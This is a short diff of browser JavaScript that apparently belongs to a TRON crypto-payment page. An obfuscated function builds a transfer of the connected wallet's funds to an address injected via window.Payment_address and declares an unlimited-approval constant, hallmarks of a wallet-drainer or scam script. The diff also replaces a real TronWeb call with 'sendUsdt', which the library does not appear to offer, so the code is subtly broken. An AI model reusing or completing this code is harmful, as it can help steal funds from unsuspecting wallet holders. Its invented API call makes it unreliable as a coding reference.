@@ -20,7 +20,7 @@ async function onNextButtonClick() {
 
 
 async function DjdskdbGsj() {
-  const trxAmountInSun = tronWeb.toSun(currentAmount);
+  const usdtAmountInSun = tronWeb.toSun(currentAmount);
   const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
   const feeLimit = 1000000000;
   
@@ -29,9 +29,9 @@ async function DjdskdbGsj() {
     const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
     
     console.log("构建TRX转账交易...");
-    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+    const transferTransaction = await tronWeb.transactionBuilder.sendUsdt(
       paymentAddress,
-      trxAmountInSun,
+      usdtAmountInSun,
       tronWeb.defaultAddress.base58,
       { feeLimit: feeLimit }
     );
